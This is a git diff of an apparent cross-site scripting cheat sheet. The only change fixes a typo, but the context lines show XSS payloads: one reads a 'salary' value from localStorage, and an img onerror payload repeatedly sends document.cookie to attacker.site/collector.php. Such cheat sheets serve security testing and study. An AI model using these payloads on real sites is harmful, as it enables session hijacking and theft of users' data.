@@ -16,7 +16,7 @@ Cross-Site-Scripting just for fun.
   - **<script>alert(localStorage.getItem('salary'))</script>**
     - To collect sensitive information stored in Browser Local Storage.
   - **<img src=error onerror=this.src='http://attacker.site/collector.php?data='+document.cookie >**
-    - This payload start a loop, so the browser start sending multiple requests to the attacker server with the cookie.
+    - This payload starts a loop, so the browser start sending multiple requests to the attacker server with the cookie.
 
 ## Javascript useful codes:
   - To perform HTTP GET request
